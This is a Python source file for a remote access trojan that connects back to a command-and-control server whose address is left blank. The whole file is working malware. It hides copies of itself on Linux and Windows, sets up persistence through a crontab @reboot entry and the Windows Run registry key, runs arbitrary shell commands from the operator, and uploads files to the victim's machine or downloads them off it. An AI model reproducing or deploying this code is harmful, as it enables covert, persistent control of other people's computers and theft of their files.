#!/usr/bin/python3
import socket
import sys
import subprocess
import os
import time
import json 
import base64
from threading import Thread

# Host and port to connect back to the cnc server
HOST = '' 
PORT = 0
OS = sys.platform
USER = os.getlogin()

if 'linux' in OS:
    loc = '/var/lib/.bash/'  # Hidden directory in the /var/lib folder
    subprocess.Popen("export DISPLAY=:0.0",shell=True)  # To open graphical programs like browser
    if not os.path.exists(loc):
        try:
            os.mkdir(loc)   # Creates the directory 
            loc += '.' + USER
            os.mkdir(loc)
            subprocess.Popen('cp ' + sys.executable + ' ' + loc + '/.bash',shell=True)   # Copies the current executable to the hidden directory
        except:
            pass        
        cmd = 'echo "@reboot ' + loc + '/.bash" | crontab -' # Adds the executable as a startup program
        subprocess.Popen(cmd,shell=True)

elif 'win' in OS:
    loc = 'C:\\Users\\'+ USER + '\\AppData\\Roaming' + '\\windows32.exe'   # Location to save the exe
    if not os.path.exists(loc):
        try:
            cmd = 'copy ' + sys.executable + ' "' + loc + '"' # Copies the executable to the directory
            subprocess.call(cmd,shell=True) 
            subprocess.call('attrib +s +h "' + loc + '"')   # Declares the exe as hidden and system file
            cmd = 'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v windows32 /t REG_SZ /d "' + loc + '"'  # Makes the exe as a startup program
            subprocess.call(cmd,shell=True)
        except:
            pass
elif 'darwin' in OS:
    # No idea how to do it
    pass

def Connect():
    try:
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((HOST,PORT))
        s.settimeout(200)
        Send_Commands(s)
    except:
        time.sleep(20)
        Connect()

def Send_Assist(data,conn):
    try:
        send_data = json.dumps(data)
        conn.send(send_data.encode())
    except:
        return

def Recv_Assist(conn):
    data = ""
    while True:
        try:
            data += conn.recv(1024).decode()
            return json.loads(data)
        except ValueError:
            continue
        except:
            break
    return


def Send_Commands(s):
    while True:
        try:
            data = Recv_Assist(s)
            if len(data) == 0:
                break
            elif data[:2] == 'cd':
                try:
                    os.chdir(data[3:])
                    Send_Assist(os.getcwd()+"\n",s)
                except:
                    Send_Assist("[-] Cannot find the directory",s)
            elif data == 'exit':
                s.close()
                break
            elif data[:6] == 'upload':
                name = os.path.basename(data[7:])
                with open(name,'wb') as f:
                    try:
                        file_data = Recv_Assist(s)
                        file_data = base64.b64decode(file_data)
                        f.write(file_data)
                        Send_Assist("[+] Done Uploading",s)
                    except:
                        num = num2 = 10
                        num +=num2
                        pass
            elif data[:8] == "download":
                try:
                    if os.path.exists(data[9:]):
                        try:
                            Send_Assist("[+] True",s)
                            with open(data[9:],'rb') as f:
                                file_data = base64.b64encode(f.read()).decode() # Encoding the file data
                                Send_Assist(file_data,s)
                        except Exception as e:
                            Send_Assist("[-] Something went wrong while uploading" + str(e),s)
                    else:
                        Send_Assist("[-] File doesn't exits")
                except:
                    num = num2 = 20
                    num *= num2
                    pass
            elif data[:5] == "start":
                try:
                    output = subprocess.Popen(data[6:],shell=True)
                    Send_Assist("[+] Command executed succesfully",s)
                except:
                    Send_Assist("[-] Something went wrong while executing the command",s)
            elif len(data) > 0:
                try:
                    output = subprocess.Popen(data, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                    result = output.stdout.read() + output.stderr.read()
                    result = result.decode()
                    result += "\n"
                    Send_Assist(result,s)
                except:
                    pass
        except:
            s.close()
            break
    return

while True:
    Connect()
    time.sleep(5)
